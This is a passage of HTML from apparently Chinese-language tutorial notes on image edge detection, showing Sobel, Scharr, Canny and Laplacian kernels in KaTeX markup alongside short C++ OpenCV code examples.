class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>y</mi></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>2</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">G_y=\begin{bmatrix}-1 &amp; -2 &amp; -1\\0 &amp; 0 &amp; 0\\1 &amp; 2 &amp; 1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>Sobel算子边缘描述能力比robot算子好一些。</li></ul><h3 id="代码实现-8"><a class="markdownIt-Anchor" href="#代码实现-8"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat grad_x,grad_y;</span><br><span class="line">Sobel(src,grad_x,CV_32F,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">Sobel(src,grad_y,CV_32F,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">convertScaleAbs(grad_x,grad_x);</span><br><span class="line">convertScaleAbs(grad_y,grad_y);</span><br><span class="line">Mat dst;</span><br><span class="line"><span class="comment">//add(grad_x,grad_y,dst);</span></span><br><span class="line">addWeighted(grad_x,<span class="number">0.5</span>,grad_y,<span class="number">0.5</span>,<span class="number">0</span>,dst);</span><br></pre></td></tr></table></figure><h2 id="scharr算子"><a class="markdownIt-Anchor" href="#scharr算子"></a> Scharr算子</h2><h3 id="scharr算子-2"><a class="markdownIt-Anchor" href="#scharr算子-2"></a> Scharr算子</h3><ul><li>数学描述</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>x</mi></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>10</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>10</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">G_x=\begin{bmatrix}-3 &amp; 0 &amp; 3\\-10 &amp; 0 &amp; 10\\-3 &amp; 0 &amp; 3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>y</mi></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>10</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>10</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">G_y=\begin{bmatrix}-3 &amp; -10 &amp; -3\\0 &amp; 0 &amp; 0\\3 &amp; 10 &amp; 3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>Scharr算子对于图像边缘有极强的检测能力，如果图像边缘不容易获取，可以使用Scharr。</li></ul><h3 id="代码实现-9"><a class="markdownIt-Anchor" href="#代码实现-9"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat grad_x,grad_y;</span><br><span class="line">Scharr(src,grad_x,CV_32F,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">Scharr(src,grad_y,CV_32F,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">convertScaleAbs(grad_x,grad_x);</span><br><span class="line">convertScaleAbs(grad_y,grad_y);</span><br><span class="line">Mat dst;</span><br><span class="line"><span class="comment">//add(grad_x,grad_y,dst);</span></span><br><span class="line">addWeighted(grad_x,<span class="number">0.5</span>,grad_y,<span class="number">0.5</span>,<span class="number">0</span>,dst);</span><br></pre></td></tr></table></figure><h2 id="kirsch算子和robinson算子"><a class="markdownIt-Anchor" href="#kirsch算子和robinson算子"></a> Kirsch算子和Robinson算子</h2><h2 id="canny边缘检测"><a class="markdownIt-Anchor" href="#canny边缘检测"></a> Canny边缘检测</h2><ul><li>整合了很多基础算法，得到很好的边缘检测效果</li><li>使用高低阈值，减少单一阈值造成图像边缘检测的不连续。</li></ul><h3 id="步骤"><a class="markdownIt-Anchor" href="#步骤"></a> 步骤</h3><ol><li><strong>模糊去噪声</strong></li></ol><ul><li>使用高斯滤波</li></ul><ol start="2"><li><strong>提取梯度与方向</strong></li></ol><ul><li>使用sobel算子，计算x,y方向的值，获取L2梯度</li></ul><ol start="3"><li><strong>非最大信号抑制</strong></li></ol><ul><li>在前面获得的梯度方向，判断该像素与方向两侧相比，是否是最大，最大保留。否则丢弃</li></ul><ol start="4"><li><strong>高低阈值链接</strong></li></ol><ul><li>设高阈值T1、低阈值T2，其中T1/T2=2~3</li><li>策略：大于高阈值全部保留，小于低阈值全部丢弃，之间的可以连接到高阈值像素点的保留</li></ul><h3 id="代码实现-10"><a class="markdownIt-Anchor" href="#代码实现-10"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> t1=<span class="number">50</span>;</span><br><span class="line">Mat src;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cannyChange</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">void</span>*)</span></span>&#123;</span><br><span class="line">Mat edges,dst;</span><br><span class="line">  <span class="comment">//src,edges,低阈值,高阈值,周围几个梯度一起算,是否用l2梯度</span></span><br><span class="line">  Canny(src,edges,t1,t1*<span class="number">3</span>,<span class="number">3</span>,<span class="literal">false</span>);</span><br><span class="line">  imshow(<span class="string">&quot;edge&quot;</span>,edges);</span><br><span class="line">  <span class="comment">//显示边缘的颜色</span></span><br><span class="line">  <span class="comment">//bitwise_and(src,src,dst,edges);</span></span><br><span class="line">  <span class="comment">//imshow(&quot;edge&quot;,dst);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建拖动条：拖动条名称，窗体名称，变量，阈值范围，回调函数，用户数据</span></span><br><span class="line">imshow(<span class="string">&quot;input&quot;</span>,src);</span><br><span class="line">createTrackbar(<span class="string">&quot;threshold value:&quot;</span>,<span class="string">&quot;input&quot;</span>,&amp;t1,<span class="number">100</span>,cannyChange);</span><br><span class="line">cannyChange(<span class="number">0</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="二阶导数算子"><a class="markdownIt-Anchor" href="#二阶导数算子"></a> 二阶导数算子</h2><ul><li>对图像进行二阶导数，那么图像的边缘将则过0点。</li></ul><p><img src="/images/pasted-70.png" alt="二阶导数" /></p><ul><li>四邻域拉普拉斯算子</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>4</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}0 &amp; 1 &amp; 0\\1 &amp; -4 &amp; 1\\0 &amp; 1 &amp; 0\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>八邻域拉普拉斯算子</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>8</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}1 &amp; 1 &amp; 1\\1 &amp; -8 &amp; 1\\1 &amp; 1 &amp; 1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">8</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" 